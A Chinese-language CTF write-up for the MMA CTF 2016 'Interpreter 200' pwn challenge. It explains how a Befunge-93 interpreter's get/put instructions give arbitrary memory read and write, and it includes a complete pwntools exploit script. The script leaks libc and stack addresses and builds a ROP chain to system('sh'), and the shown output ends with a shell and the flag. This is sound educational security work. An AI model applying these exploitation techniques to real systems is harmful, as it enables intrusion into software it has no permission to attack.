---
title: '[MMA CTF 2nd 2016] Interpreter 200'
author: bruce30262
tags:
  - pwn
  - MMA CTF 2nd 2016
categories:
  - write-ups
date: 2016-09-07 18:04:00
---
## Info  
> Category: pwn  
> Point: 200  
> Solver: bruce30262 @ BambooFox

## Analyzing  
首先透過 `file` 指令以及 [checksec.sh](http://www.trapkit.de/tools/checksec.html) 的幫助，我們可以知道這是一個 x86_64 的 ELF，保護全開:  
<pre>
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   ./befunge_patch  
</pre>

之後透過將程式丟入 IDA Pro 做靜態分析，以及試著執行程式，對程式行為進行簡單的動態分析之後，我們可以得知:  
* 這是一隻 [Befunge-93](https://en.wikipedia.org/wiki/Befunge) 程式的 Interpreter。程式一開始會要求我們輸入一個 Befunge-93 程式，之後會試著解譯並執行我們的程式。  
* 一隻 Befunge-93 程式由一連串的 [Befunge-93 指令](https://en.wikipedia.org/wiki/Befunge#Befunge-93_instruction_list) 所組成。我們可以輸入很多行的 Befunge-93 指令(一行最多80個字元，最多25行)。  
* 程式之後會一個字元一個字元的解譯並執行我們的Befunge-93 指令，最多執行到第 10000 個指令  
 
整理成 pseudo code 之後大概是這種感覺:  
```C  
// 不重要的部分將以註解代替
// 實際程式有做哪些事情可以自行利用 IDA Pro 進行分析
int main()
{
	puts("Welcome to Online Befunge(93) Interpreter");
	puts("Please input your program.");
	program = read_program(); // read user input to buffer 'program'
	
	step = 10001;
	row = 0, col = 0;
	do
	{
		ins = program[80 * row + col]
		switch ( ins )
		{
			.....//other instruction...
			case '&': // ask user for a number and push it to stack
				__isoc99_scanf("%d", &x);
				push(x);
				break;
			case '.': // Pop value and output as an integer followed by a space
				x = pop();
				__printf_chk(1LL, "%d ", x);
				break;
			.....//other instruction...
			case '*':  // pop x, y, push x*y
				a = pop();
				b = pop();
				push(a * b);
				break;
			.....//other instruction...
			case 'g': // (get) Pop x and y, then push ASCII value of the character at that position in the program
				x = pop();
				y = pop();
				push( (char)(program[80 * x + y]) );
				break;
			case 'p': // (put) Pop x, y, and z, then change the character at (x,y) in the program to the character with ASCII value z
				x = pop();
				y = pop();
				z = pop();
				program[80 * x + y] = (char)z;
				break;
			case ' ': // space = do nothing
				break;
		}
		--step;
		// update row & column
		// do other stuff...
	}while ( step );
	puts("Too many steps. Is there any infinite loops?");
	return 0LL;
}
```
pseudo code 將一些比較重要的功能都列在上面了。  

透過觀察程式的行為，我們不難發現:  
* 利用 `&`, `g` 和 `.` 的功能，我們有辦法做到**任意讀**。
	* 先透過 `&` 將 `x` 跟 `y` push 到 Stack 上
		* `x` 與 `y` 我們可控(32 bit integer)
		* 這邊注意 Stack (大寫S) 是程式在 bss 段自行模擬出來的一塊，擁有類似 stack 行為的記憶體區塊，並不是指程式真正的 stack。
	* `g` 的功能是將 `program[80 * x + y]` 的內容 push 至 Stack 上。因為`x` 與 `y` 我們可控，代表著我們可以將任意位址的內容 push 到 Stack 上。
	* `.` 會將 Stack 頂端的值(可控) pop 出來 (1 byte)，並印出他的數值。
* 利用 `&` 和 `p` 的功能，我們還有辦法做到**任意寫**
	* 先透過 `&` 將 `x`, `y`與 `z` push 到 Stack 上
	* `p` 功能會先從 Stack pop 出 3 個值 (`x`, `y`, `z`，均可控)，之後將 z 的值放入 `program[80 * x + y]` (即`program[80 * x + y] = z`)。  
* 還有一點要注意  
	* 因為透過 `&` 功能將數值 push 進 Stack 時，一次只能 push 一個 integer (32 bit)。如果我們想要使 `program[80 * x + y]` 跳到很遠的地方，`x` 與 `y` 很有可能會需要是一個超過 integer 範圍的數值，如此一來使用 `&`功能將無法滿足我們的需求。
	* 解決方法，是利用 `*` 功能。`*` 會從 Stack 頂端 pop 出兩個數值 `x`與`y`，並將 `x * y` 的結果 push 回 Stack 上。這裡全程是使用 64 bit register 進行操作，所以不會有 integer 32 bit 的問題。
	* 因此，先透過`*`功能將 Stack 頂端變成一個 long integer，之後我們就可以利用上面的方法**對任意位址做任意讀寫。**

## Exploit  
現在我們知道洞在哪了，也知道該怎麼利用這個漏洞進行任意位址的讀寫操作。因為這題有DEP無法執行 shellcode，因此首要的任務是要去 leak libc 的 address，我們才有辦法知道 `system` 的位址，進而執行 `system('sh')` 拿 shell。  
  
而要 leak libc 的 address 其實不難。這題雖然 GOT 不能寫，但還是可以讀，因此我們可以透過任意讀的漏洞來 leak GOT，獲得 libc 的 address。這裡我是去 leak `__libc_start_main` 的 GOT，並透過 [libc-database](https://github.com/niklasb/libc-database) 來獲取遠端 libc 的版本以及相關的 offset。  
  
現在我們有了 libc 的 address，該跳 system 了。問題是該怎麼跳呢?這題沒有 function pointer， GOT 與 fini array 都是唯讀，我們無法透過 overwrite function pointer 或是 GOT hijacking 的方式來 exploit。**唯一的辦法，就是去 overwrite return address**。  
  
問題來了: 要 overwrite return address，首先我們必須知道 stack 的位址，因此我們必須要有辦法先 leak stack address。而要 leak stack address，有以下幾種方式:  
* **leak stack 上的 saved rbp 或是 argv**。這部份通常是用在 format string 的漏洞，這題無法這樣做。  
* **leak tls section 上的 stack address**。這部份比較進階，簡單來說就是程式在執行的時候，會有個 memory 的區塊叫做 tls section，裡面會存許多有用的東西，像是 stack canary, main_arena 的 address, 以及一個不知道指向哪裡的 stack address。而要透過這種方式 leak stack address，我們必須要有辦法知道 tls section 的位址，而這通常需要透過程式先呼叫 mmap，之後 leak mmap 出來的 memory address 來達成。這題因為沒有 malloc 或是 mmap，所以也無法透過這樣的方式來 leak stack address。  
* **leak ld-linux.so 的 __libc_stack_end symbol**。如果我們有辦法知道 ld-linux.so 的位址以及版本，我們可以透過 leak 裡面的 `__libc_stack_end` 這個 symbol，來獲取 stack address。這題用這種方式理論上辦的到，我自己就是用這種方式 leak 的，只是做起來非常麻煩。解完這題之後，經詢問別人才發現原來還有第四種方式。  
* **leak libc 裡面的 environ symbol**。經過 pwn queen meh 的提點，才知道原來 libc 裡面有個 symbol 叫做 `environ`，裡面會存 stack address。因此這題比較漂亮的方式，是 leak libc 的 address 之後，直接 leak `libc.symbols['environ']` 來獲取 stack address。 
  
不過當時的我還是採取了第三種，也就是先 leak ld-linux.so，再 leak `__libc_stack_end` 的方式來獲取 stack address。ld-linux.so 的版本是直接用 libc 版本去猜。至於 leak ld-linux.so 的位址有幾種方式:  
* leak `dl_resolve` 的GOT。`dl_resolve` 位於 `ld-linux.so` 裡面，而它的 GOT 通常位於 GOT\[2\] ( 第三個 GOT entry ) 這個位置，因此如果有辦法 leak `dl_resolve` 的 GOT， 可以直接獲得 ld-linux.so 的位址。但是這題因為是 FULL RELRO 的關係，因此 GOT[2] 的位址是空的 ( 因為function 已經 bind 好了不需要做 runtime resolve )， 無法利用這樣的方式來 leak。
* leak DT_DEBUG 的 info。這部份請參考[這個連結](http://rk700.github.io/article/2015/04/09/dt_debug-read)。簡而言之，這題用這種方式是可行的 ( 有辦法 leak 到 ld-linux.so )。  
  
因此總結這題的 exploit 方法:  
* 先透過任意讀的漏洞 leak libc 的 address
* (錯誤解法) 透過任意讀的漏洞 leak ld-linux.so 的 address，再 leak `__libc_stack_end` 來獲得 stack address  
* (正確解法) 直接 leak libc 的 `environ` symbol 來獲取 stack address
* 透過任意寫的漏洞，overwrite return address
	* 可透過 pop_rdi --> bin_sh 字串 --> system 的方式做 ROP 來拿 shell 

final exploit ( leak ld-linux.so的版本 ) :
```python exp_bef.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time
import math

HOST = "pwn1.chal.ctf.westerns.tokyo" 
PORT = 62839
ELF_PATH = "./befunge_patch"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def str_addr(s, f): # search string address in file
    result = list(f.search(s+"\x00"))
    if not len(result): # no result
        return None
    else:
        return result[0]

def leak_one_byte(off_1, off_80):
    r.sendline(str(off_1))
    r.sendline(str(off_80))
    ret = r.recvuntil(" ")
    return int(ret)

def leak_addr(base, off_80, name=None):
    ret_addr = 0
    cnt = 0
    for i in xrange(base, base+6):
        print "leaking %s byte : %d" % (name, cnt+1)
        ret = leak_one_byte(i, off_80)
        ret_addr = ret_addr | ((ret&0xff) << 8*cnt)
        cnt += 1

    return ret_addr

def cal_offset(addr, text_base):
    start_from = text_base + 0x202040
    offset = addr - start_from
    off_80 = offset/80
    off_1 = offset%80

    return off_1, off_80

def leak_far_addr(addr, text_base, name):
    ret_addr = 0
    cnt = 0
    off_1, off_80 = cal_offset(addr, text_base)
    temp = int(math.sqrt(off_80))
    off_1 = (off_80 - temp**2)*80 + off_1

    for i in xrange(off_1, off_1+6):
        print "leaking %s byte : %d" % (name, cnt+1)
        r.sendline(str(i))
        r.sendline(str(temp))
        r.sendline(str(temp))
        ret = int(r.recvuntil(" "))
        ret_addr = ret_addr | ((ret&0xff) << 8*cnt)
        cnt += 1

    return ret_addr

def write_far_addr(addr, text_base, name, value):
    cnt = 0
    off_1, off_80 = cal_offset(addr, text_base)
    temp = int(math.sqrt(off_80))
    off_1 = (off_80 - temp**2)*80 + off_1

    for i in xrange(off_1, off_1+6):
        v = (value>>(8*cnt)) & 0xff
        print "writing %s byte %d : %x" % (name, cnt+1, v)
        r.sendline(str(v))
        r.sendline(str(i))
        r.sendline(str(temp))
        r.sendline(str(temp))
        cnt += 1

if __name__ == "__main__":
    
    #LOCAL = True
    LOCAL = False
    
    # construct befunge-93 program
    preline = myexec("wc -l ./bbb | awk '{print $1}'")
    preline = int(preline)
    f = open("./bbb", "r")
    s = f.read()
    s += "\n"*(80-preline)
    
    r, LD = None, None
    if not LOCAL:
        r = remote(HOST, PORT)
        LD = ELF("/mnt/files/ld-linux-x86-64.so.2") # ubuntu 14.04 64 bit ld-linux
    else:
        r = process(ELF_PATH)
        LD = ELF("/lib64/ld-linux-x86-64.so.2")

    # send program
    r.sendlineafter("> ", s)
    r.recvuntil("> > > > > > > > > > > > > > > > > > > > > > > > ")

    # leak libc
    libc_main = leak_addr(-48, -2, "libc_main")
    libc_base, system, bin_sh = None, None, None
    # for local
    if LOCAL:
        libc.address += libc_main - libc.symbols['__libc_start_main']
        libc_base = libc.address
        system = libc.symbols['system']
        bin_sh = str_addr("sh\x00", libc)
    # for remote
    else: 
        libc_base = libc_main - 0x21e50
        system = libc_base + 0x0000000000046590
        bin_sh = libc_base + 0x17c8c3

    # leak text base
    text_base = leak_addr(-56, -9, "text_base")
    text_base -= 0xb00

    log.info("libc_base: "+hex(libc_base))
    log.info("text_base: "+hex(text_base))
    
    # leak r_debug
    r_debug = leak_addr(0, -7, "r_debug")
    log.info("r_debug: "+hex(r_debug))

    # traverse link_map structure & leak ld-linux.so base address
    link_map_addr = r_debug + 8
    link_map_text = leak_far_addr(link_map_addr, text_base, "link_map_text")
    log.info("link_map_text: "+hex(link_map_text))
    link_map_vdso = leak_far_addr(link_map_text+24, text_base, "link_map_vdso")
    log.info("link_map_vdso: "+hex(link_map_vdso))
    link_map_libc = leak_far_addr(link_map_vdso+24, text_base, "link_map_libc")
    log.info("link_map_libc: "+hex(link_map_libc))
    link_map_ld = leak_far_addr(link_map_libc+24, text_base, "link_map_ld")
    log.info("link_map_ld: "+hex(link_map_ld))
    ld_base = leak_far_addr(link_map_ld, text_base, "ld_base")
    log.info("ld_base: "+hex(ld_base))
    # leak __libc_stack_end in ld-linux.so, get stack address
    LD.address += ld_base
    log.info("libc_stack_end: "+hex(LD.symbols['__libc_stack_end']))
    stack_addr = leak_far_addr(LD.symbols['__libc_stack_end'], text_base, "stack addr")
    log.info("stack_addr: "+hex(stack_addr))
    
    pop_rdi = text_base + 0x000000000000120c
    ret_addr = stack_addr - 216
    log.info("ret_addr: "+hex(ret_addr))
    log.info("pop_rdi: "+hex(pop_rdi))
    log.info("bin_sh: "+hex(bin_sh))
    log.info("system: "+hex(system))
    
    # overwrite return address
    write_far_addr(ret_addr, text_base, "ret_addr", pop_rdi)
    write_far_addr(ret_addr+8, text_base, "ret_addr+8", bin_sh)
    write_far_addr(ret_addr+16, text_base, "ret_addr+16", system)

    r.interactive()
```
`bbb` 這個檔案是要給程式的 Befunge-93 instruction:  
```
>                                    v
v.g&&.g&&.g&&.g&&.g&&.g&&            <
>&&g.&&g.&&g.&&g.&&g.&&g.            v
v.g&&.g&&.g&&.g&&.g&&.g&&            <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&&*p&&&&*p&&&&*p&&&&*p&&&&*p&&&&*pv
v                                    < 
>&&&&*p&&&&*p&&&&*p&&&&*p&&&&*p&&&&*pv
v                                    < 
>&&&&*p&&&&*p&&&&*p&&&&*p&&&&*p&&&&*pv
v                                    < 
>                                    ^
```
可以看到最後有個無限迴圈，為的是要讓程式執行到最後跳出 do-while 迴圈，之後跑到 main 的結尾來做 ret，接上我們的 ROP chain。

跑起來大概長的像這樣:
<pre>
leaking libc_main byte : 1
leaking libc_main byte : 2
leaking libc_main byte : 3
................
writing ret_addr+16 byte 5 : b4
writing ret_addr+16 byte 6 : 7f
[*] Switching to interactive mode
Too many steps. Is there any infinite loops?
// ls
befunge
flag
// cat flag
TWCTF{It_1s_eMerG3nCy}
[*] Closed connection to pwn1.chal.ctf.westerns.tokyo port 62839
</pre>  
  
flag: `TWCTF{It_1s_eMerG3nCy}`





